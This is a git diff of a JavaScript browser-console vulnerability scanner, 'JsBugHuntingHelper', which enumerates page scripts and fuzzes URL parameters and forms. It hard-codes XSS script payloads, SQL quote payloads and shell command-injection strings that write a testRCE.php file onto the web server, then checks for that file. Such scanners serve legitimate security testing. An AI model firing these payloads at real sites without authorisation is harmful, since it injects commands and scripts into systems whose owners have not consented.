@@ -10,59 +10,42 @@
 function JsBugHuntingHelper () {
   'use strict'
 
+  const alreadyProcessedFunctions = []
   const xssScanEnabled = true
   const sqlInjectionScanEnabled = true
   const RCEscanEnabled = true
   const formFuzzingEnabled = true
 
-  const payloadsXSS = ['<script>alert("XSS_VULNERABLE_PARAM")</script>', '"><script>alert("XSS_VULNERABLE_PARAM")</script><div class="']
+  const payloadsXSS = ['<script>alert("XSS_VULNERABLE_PARAM")</script>', '"><script>alert("XSS_VULNERABLE_PARAM")</script><div ', "'"]
   const payloadsSQLi = ['"', "'"]
-  const payloadsRCE = ['test" || echo "TEST_RCE" > /var/www/html/testRCE.php#', 'echo "TEST_RCE" > /var/www/html/testRCE.php#', 'test" || echo "TEST_RCE" > /var/www/testRCE.php#', 'echo "TEST_RCE" > /var/www/testRCE.php#']
+  const payloadsRCE = ['test" || echo "TEST_RCE" > /var/www/html/testRCE.php#', 'echo "TEST_RCE" > /var/www/html/testRCE.php#','test" || echo "TEST_RCE" > /var/www/testRCE.php#', 'echo "TEST_RCE" > /var/www/testRCE.php#']
 
   // eslint-disable-next-line no-multiple-empty-lines
   // eslint-disable-next-line no-unused-vars
-  // @return void
-  this.init = async function () {
+  this.init = function () {
     console.log('Created by Davide Cavallini')
     console.log('Linkedin: https://www.linkedin.com/in/davidecavallini/')
     console.log('----------------------------------------------------------')
     console.log('\n')
 
-    console.log('Window Memory Suspicious Points')
-    console.log(recursiveEnumerate(window, 0))
-    console.log('JS Listeners Suspicious Points')
-    console.log(recursiveEnumerate(listAllEventListeners(), 0))
-    console.log('JQuery Listeners Suspicious Points')
-    console.log(searchJqueryListeners())
-    console.log('JQuery Document Listeners Suspicious Points')
-    console.log(recursiveEnumerate(getjQueryEventHandlers(document), 0))
-    console.log('Body Source Suspicious Points')
-    console.log(searchInside(document.body.innerHTML.replace(/(\r\n|\n|\r)/gm, '').replace(/\s\s+/g, ' '), document.body, ['BODY'], 0, 0))
-
-    console.log('Cookie', document.cookie)
-
-    const headers = await getPageHeaders(document.location.href)
-    console.log('Headers', headers)
-
+    recursiveEnumerate(window, 0)
+    recursiveEnumerate(listAllEventListeners(), 0)
+    searchInside(document.body.innerHTML.replace(/(\r\n|\n|\r)/gm, '').replace(/\s\s+/g, ' '), document.body, ['BODY'], 0, 0)
+    recursiveEnumerate(getjQueryEventHandlers(document), 0)
+    searchJqueryListeners()
+    console.log('Contenuto cookie', document.cookie)
+    getPageHeaders(document.location.href)
     if (xssScanEnabled === true) {
-      console.log('URL XSS Vulnerabilities')
-      const xss = await testXSS()
-      console.log(xss)
+      testXSS()
     }
     if (sqlInjectionScanEnabled === true) {
-      console.log('URL SQL Injection Vulnerabilities')
-      const sql = await testSqlInjection()
-      console.log(sql)
+      testSqlInjection()
     }
     if (RCEscanEnabled === true) {
-      console.log('URL RCE Vulnerabilities')
-      const rce = await testRCE()
-      console.log(rce)
+      testRCE()
     }
     if (formFuzzingEnabled === true) {
-      console.log('Form Vulnerabilities')
-      const form = await formFuzzer()
-      console.log(form)
+      formFuzzer()
     }
     console.log('\n')
     console.log('----------------------------------------------------------')
@@ -76,7 +59,8 @@ function JsBugHuntingHelper () {
     this.string = string
   }
 
-  const searchElements = [
+  // eslint-disable-next-line prefer-const, no-var
+  var searchElements = [
   // new SearchElement('single line comment', 'string', ' //'),
   // new SearchElement('block comment', 'string', '/*'),
     new SearchElement('form', 'string', '<form'),
@@ -226,6 +210,9 @@ function JsBugHuntingHelper () {
     }
 
     return elements
+  /* .sort(function(a,b) {
+              return a.type.localeCompare(b.type);
+            }); */
   }
 
   function regEx (string, regEx) {
@@ -249,12 +236,7 @@ function JsBugHuntingHelper () {
     return indexes
   }
 
-  function searchInside (functionToString, object, objKeys, o, level, resultTmp) {
-    let result = []
-    if (resultTmp !== undefined) {
-      result = resultTmp
-    }
-
+  function searchInside (functionToString, object, objKeys, o, level) {
     if (objKeys[o] === undefined) {
       objKeys[o] = ''
     }
@@ -266,61 +248,50 @@ function JsBugHuntingHelper () {
       if (v.type === 'string') {
         const index = getAllIndexes(functionToString, v.string)
         index.forEach((ind) => {
-          result.push({ type: 'string', description: v.description, level, name: objKeys[o], function: object[objKeys[o]], declaration: functionToString.substr(ind - 15, 60) })
-          // console.log(result)
+          console.log('DDDX ' + v.description, level, objKeys[o], object[objKeys[o]], functionToString.substr(ind - 15, 60))
         })
       } else if (v.type === 'regEx') {
-        // console.log('REGEX')
+      // console.log('REGEX')
         const index = regEx(functionToString, v.string)
         // console.log('regEx Index', index)
         index.forEach((ind) => {
           if (objKeys[o] !== 'string') {
-            result.push({ type: 'regEx', description: v.description, level, name: objKeys[o], function: object[objKeys[o]], declaration: functionToString.substr(ind - 15, 60) })
-            // console.log(result)
+            console.log('DDDX regEx ' + v.description, level, objKeys[o], object[objKeys[o]], functionToString.substr(ind - 15, 60))
           }
         })
       }
     })
-    if (resultTmp === undefined) {
-      return result
-    }
   }
 
   function recursiveEnumerate (object, level) {
-    function recursion (object, level) {
-      level++
-      const objKeys = Object.keys(object)
-      // console.log("A", object)
+    level++
+    const objKeys = Object.keys(object)
+    // console.log("A", object)
 
-      for (let o = 0; o < objKeys.length; o++) {
-        if (object[objKeys[o]] !== null && (typeof object[objKeys[o]] === 'function' || typeof object[objKeys[o]] === 'object') && objKeys[o] !== 'JsBugHuntingHelper' && objKeys[o] !== 'recursion' && objKeys[o] !== 'recursiveEnumerate' && objKeys[o] !== 'alreadyProcessedFunctions' && objKeys[o] !== 'jsHuntingHelper') {
-        // rivedere sta cosa perchè mi elenca solo le funzioni interne
-          if (objKeys[o] !== 'fn') {
-            const functionToString = object[objKeys[o]].toString().replace(/(\r\n|\n|\r)/gm, '').replace(/\s\s+/g, ' ')
+    for (let o = 0; o < objKeys.length; o++) {
+      if (object[objKeys[o]] !== null && (typeof object[objKeys[o]] === 'function' || typeof object[objKeys[o]] === 'object') && objKeys[o] !== 'recursiveEnumerate' && objKeys[o] !== 'alreadyProcessedFunctions' && objKeys[o] !== 'jsHuntingHelper') {
+        try {
+          const functionToString = object[objKeys[o]].toString().replace(/(\r\n|\n|\r)/gm, '').replace(/\s\s+/g, ' ')
 
-            // console.log("B", functionToString)
+          // console.log("B", functionToString)
 
-            if (alreadyProcessedFunctions.indexOf(functionToString) === -1) {
-              // console.log("C", functionToString)
-              searchInside(functionToString, object, objKeys, o, level, result)
-              if (functionToString.indexOf('[object Object]') === -1) {
-                alreadyProcessedFunctions.push(functionToString)
-              }
+          if (alreadyProcessedFunctions.indexOf(functionToString) === -1) {
+          // console.log("C", functionToString)
+            searchInside(functionToString, object, objKeys, o, level)
 
-              if (objKeys[o] !== 'set' && objKeys[o] !== 'push') {
-                recursion(object[objKeys[o]], level)
-              }
+            if (functionToString.indexOf('[object Object]') === -1) {
+              alreadyProcessedFunctions.push(functionToString)
+            }
+
+            if (objKeys[o] !== 'set' && objKeys[o] !== 'push') {
+              recursiveEnumerate(object[objKeys[o]], level)
             }
           }
+        } catch (e) {
+
         }
       }
     }
-
-    const result = []
-    const alreadyProcessedFunctions = []
-    recursion(object, level)
-    // console.log('2', result)
-    return result
   }
 
   function searchJqueryListeners () {
@@ -335,27 +306,24 @@ function JsBugHuntingHelper () {
       }
     })
     // console.log(jQueryListeners)
-    return recursiveEnumerate(jQueryListeners, 0)
+    recursiveEnumerate(jQueryListeners, 0)
   }
 
-  async function getPageHeaders (url) {
-    return new Promise((resolve, reject) => {
-      // eslint-disable-next-line no-undef
-      const xhr = $.ajax({
-        type: 'GET',
-        url,
-        success: function () {
-          resolve(xhr.getAllResponseHeaders())
-        },
-        error: function () {
-          resolve(false)
-        }
-      })
+  function getPageHeaders (url) {
+  // eslint-disable-next-line no-undef
+    const xhr = $.ajax({
+      type: 'GET',
+      url,
+      success: function (output, status) {
+        console.log('Page Headers', xhr.getAllResponseHeaders())
+      },
+      error: function (output) {
+        console.log('Error in API call')
+      }
     })
   }
 
   async function testXSS () {
-    const result = []
     const paramsEntitiesTemp = Object.entries(getAllUrlParams(document.location.href))
     // console.log(paramsEntities)
     for (let i = 0; i < paramsEntitiesTemp.length; i++) {
@@ -371,20 +339,17 @@ function JsBugHuntingHelper () {
         const newUrl = document.location.origin + document.location.pathname + '?' + mod.join('&')
 
         // eslint-disable-next-line no-undef
-        try {
-          await $.get(newUrl).done(function (data) {
-            if (data.indexOf('alert("XSS_VULNERABLE_PARAM")') !== -1) {
-              result.push({ paramName: v[0], type: 'XSS via Url', url: newUrl })
-            }
-          })
-        } catch (reason) { console.log(reason) }
+        await $.get(newUrl).done(function (data) {
+          if (data.indexOf('alert("XSS_VULNERABLE_PARAM")') !== -1) {
+            console.log('Parametro "' + v[0] + '" Vulnerabile ad attacchi XSS')
+            console.log('url', newUrl)
+          }
+        })
       }
     }
-    return result
   }
 
   async function testSqlInjection () {
-    const result = []
     const paramsEntitiesTemp = Object.entries(getAllUrlParams(document.location.href))
     // console.log(paramsEntities)
     for (let i = 0; i < paramsEntitiesTemp.length; i++) {
@@ -400,20 +365,17 @@ function JsBugHuntingHelper () {
         const newUrl = document.location.origin + document.location.pathname + '?' + mod.join('&')
 
         // eslint-disable-next-line no-undef
-        try {
-          await $.get(newUrl).done(function (data) {
-            if (data.indexOf('Uncaught mysql') !== -1) {
-              result.push({ paramName: v[0], type: 'SQL Injection via Url', url: newUrl })
-            }
-          })
-        } catch (reason) { console.log(reason) }
+        await $.get(newUrl).done(function (data) {
+          if (data.indexOf('Uncaught mysql') !== -1) {
+            console.log('Parametro "' + v[0] + '" Vulnerabile ad SQL Injection')
+            console.log('url', newUrl)
+          }
+        })
       }
     }
-    return result
   }
 
   async function testRCE () {
-    const result = []
     const paramsEntitiesTemp = Object.entries(getAllUrlParams(document.location.href))
     // console.log(paramsEntities)
     for (let i = 0; i < paramsEntitiesTemp.length; i++) {
@@ -429,155 +391,111 @@ function JsBugHuntingHelper () {
         const newUrl = document.location.origin + document.location.pathname + '?' + mod.join('&')
 
         // eslint-disable-next-line no-undef
-        try { await $.get(newUrl).done(function (data) { }) } catch (reason) { console.log(reason) }
+        await $.get(newUrl).done(function (data) { })
         // eslint-disable-next-line no-undef
-        try {
-          await $.get(document.location.origin + '/testRCE.php').done(function (data) {
-            if (data.indexOf('TEST_RCE') !== -1) {
-              result.push({ paramName: v[0], type: 'RCE via Url', url: newUrl })
-            }
-          })
-        } catch (reason) { console.log(reason) }
+        await $.get(document.location.origin + '/testRCE.php').done(function (data) {
+          if (data.indexOf('TEST_RCE') !== -1) {
+            console.log('Parametro "' + v[0] + '" Vulnerabile a Remote Code Execution')
+            console.log('url', newUrl)
+          }
+        })
       }
     }
-    return result
-  }
-
-  function Q (root, selector) {
-    if (typeof root === 'string') {
-      selector = root
-      root = document
-    }
-    return root.querySelectorAll(selector)
   }
 
   // fuzz all forms in the webpage
   async function formFuzzer () {
-    const result = []
     // eslint-disable-next-line no-undef
-    // probabilmente il problema è questo async
-    for (const form of Q('form')) {
+    $('form').each((i, form) => {
       const originalParamsLength = $(form).find('input,button,select,checkbox').length
 
-      if (xssScanEnabled === true) {
-        for (let i = 0; i < originalParamsLength; i++) {
-          for (const payload of payloadsXSS) {
-            const tempParams = []
-            // eslint-disable-next-line no-undef
-            $(form).find('input,button,select,checkbox').each((i2, v2) => {
+      for (let i = 0; i < originalParamsLength; i++) {
+        for (const payload of payloadsXSS) {
+          const tempParams = []
+          // eslint-disable-next-line no-undef
+          $(form).find('input,button,select,checkbox').each((i2, v2) => {
             // eslint-disable-next-line no-undef
             // console.log($(v2).attr('name'), $(v2).val())
-              tempParams.push({ name: $(v2).attr('name'), value: $(v2).val() })
-            })
-            tempParams[i].value += payload
-            result.push(await sendFormRequest(form, tempParams, 'XSS', tempParams[i].name))
-          }
+            tempParams.push({ name: $(v2).attr('name'), value: $(v2).val() })
+          })
+          tempParams[i].value += payload
+          sendFormRequest(form, tempParams, 'XSS', tempParams[i].name)
         }
       }
 
-      if (sqlInjectionScanEnabled === true) {
-        for (let i = 0; i < originalParamsLength; i++) {
-          for (const payload of payloadsSQLi) {
-            const tempParams = []
-            // eslint-disable-next-line no-undef
-            $(form).find('input,button,select,checkbox').each((i2, v2) => {
+      for (let i = 0; i < originalParamsLength; i++) {
+        for (const payload of payloadsSQLi) {
+          const tempParams = []
+          // eslint-disable-next-line no-undef
+          $(form).find('input,button,select,checkbox').each((i2, v2) => {
             // eslint-disable-next-line no-undef
             // console.log($(v2).attr('name'), $(v2).val())
-              tempParams.push({ name: $(v2).attr('name'), value: $(v2).val() })
-            })
-            tempParams[i].value += payload
-            result.push(await sendFormRequest(form, tempParams, 'SQLi', tempParams[i].name))
-          }
+            tempParams.push({ name: $(v2).attr('name'), value: $(v2).val() })
+          })
+          tempParams[i].value += payload
+          sendFormRequest(form, tempParams, 'SQLi', tempParams[i].name)
         }
       }
 
-      if (RCEscanEnabled === true) {
-        for (let i = 0; i < originalParamsLength; i++) {
-          for (const payload of payloadsRCE) {
-            const tempParams = []
-            // eslint-disable-next-line no-undef
-            $(form).find('input,button,select,checkbox').each((i2, v2) => {
+      for (let i = 0; i < originalParamsLength; i++) {
+        for (const payload of payloadsRCE) {
+          const tempParams = []
+          // eslint-disable-next-line no-undef
+          $(form).find('input,button,select,checkbox').each((i2, v2) => {
             // eslint-disable-next-line no-undef
             // console.log($(v2).attr('name'), $(v2).val())
-              tempParams.push({ name: $(v2).attr('name'), value: $(v2).val() })
-            })
-            tempParams[i].value += payload
-            result.push(await sendFormRequest(form, tempParams, 'RCE', tempParams[i].name))
-          }
+            tempParams.push({ name: $(v2).attr('name'), value: $(v2).val() })
+          })
+          tempParams[i].value += payload
+          sendFormRequest(form, tempParams, 'RCE', tempParams[i].name)
         }
       }
-    }
-    // console.log('FF', result)
-    return result.filter((v) => v.paramName !== undefined)
+    })
   }
 
-  async function sendFormRequest (form, params, vulnType, modifiedParam) {
-    let result = {}
+  function sendFormRequest (form, params, vulnType, modifiedParam) {
     // eslint-disable-next-line no-undef
     const url = $(form).attr('action')
     // eslint-disable-next-line no-undef
     if ($(form).attr('method') === 'POST' || $(form).attr('method') === 'post') {
       // eslint-disable-next-line no-undef
-      try {
-        await $.post(url, params).done(function (data) {
-          if (vulnType === 'XSS') {
-            if (data.indexOf('alert("XSS_VULNERABLE_PARAM")') !== -1) {
-              result = { paramName: modifiedParam, type: 'XSS via POST Form' }
-              // console.log('Parametro POST "' + modifiedParam + '" Vulnerabile ad attacchi XSS')
-            }
-          } else if (vulnType === 'SQLi') {
-            if (data.indexOf('Uncaught mysql') !== -1) {
-              result = { paramName: modifiedParam, type: 'SQL Injection via POST Form' }
-              // console.log('Parametro POST "' + modifiedParam + '" Vulnerabile ad SQL Injection')
-            }
+      $.post(url, params).done(function (data) {
+        if (vulnType === 'XSS') {
+          if (data.indexOf('alert("XSS_VULNERABLE_PARAM")') !== -1) {
+            console.log('Parametro POST "' + modifiedParam + '" Vulnerabile ad attacchi XSS')
           }
-        })
-        if (vulnType === 'RCE') {
+        } else if (vulnType === 'SQLi') {
+          if (data.indexOf('Uncaught mysql') !== -1) {
+            console.log('Parametro POST "' + modifiedParam + '" Vulnerabile ad SQL Injection')
+          }
+        } else if (vulnType === 'RCE') {
           // qui è giusto che sia get, in quanto è un altra richiesta
-          try {
-            $.get(document.location.origin + '/testRCE.php').done(function (data) {
-              if (data.indexOf('TEST_RCE') !== -1) {
-                result = { paramName: modifiedParam, type: 'RCE via POST Form' }
-                // console.log('Parametro POST "' + modifiedParam + '" Vulnerabile a Remote Code Execution')
-              }
-            })
-          } catch (reason) { console.log(reason) }
+          $.get(document.location.origin + '/testRCE.php').done(function (data) {
+            if (data.indexOf('TEST_RCE') !== -1) {
+              console.log('Parametro POST "' + modifiedParam + '" Vulnerabile a Remote Code Execution')
+            }
+          })
         }
-      } catch (reason) { console.log(reason) }
+      })
     } else if ($(form).attr('method') === 'GET' || $(form).attr('method') === 'get') {
-      try {
-        await $.get(url, params).done(function (data) {
-          if (vulnType === 'XSS') {
-            if (xssScanEnabled === true) {
-              if (data.indexOf('alert("XSS_VULNERABLE_PARAM")') !== -1) {
-                result = { paramName: modifiedParam, type: 'XSS via GET Form' }
-              // console.log('Parametro GET "' + modifiedParam + '" Vulnerabile ad attacchi XSS')
-              }
-            }
-          } else if (vulnType === 'SQLi') {
-            if (sqlInjectionScanEnabled === true) {
-              if (data.indexOf('Uncaught mysql') !== -1) {
-                result = { paramName: modifiedParam, type: 'SQL Injection via GET Form' }
-              // console.log('Parametro GET "' + modifiedParam + '" Vulnerabile ad SQL Injection')
-              }
-            }
+      $.get(url, params).done(function (data) {
+        if (vulnType === 'XSS') {
+          if (data.indexOf('alert("XSS_VULNERABLE_PARAM")') !== -1) {
+            console.log('Parametro GET "' + modifiedParam + '" Vulnerabile ad attacchi XSS')
           }
-        })
-        if (vulnType === 'RCE') {
-          if (RCEscanEnabled === true) {
-            try {
-              await $.get(document.location.origin + '/testRCE.php').done(function (data) {
-                if (data.indexOf('TEST_RCE') !== -1) {
-                  result = { paramName: modifiedParam, type: 'RCE via GET Form' }
-                // console.log('Parametro GET "' + modifiedParam + '" Vulnerabile a Remote Code Execution')
-                }
-              })
-            } catch (reason) { console.log(reason) }
+        } else if (vulnType === 'SQLi') {
+          if (data.indexOf('Uncaught mysql') !== -1) {
+            console.log('Parametro GET "' + modifiedParam + '" Vulnerabile ad SQL Injection')
           }
+        } else if (vulnType === 'RCE') {
+          $.get(document.location.origin + '/testRCE.php').done(function (data) {
+            if (data.indexOf('TEST_RCE') !== -1) {
+              console.log('Parametro GET "' + modifiedParam + '" Vulnerabile a Remote Code Execution')
+            }
+          })
         }
-      } catch (reason) { console.log(reason) }
+      })
     }
-    return result
   }
 }
 
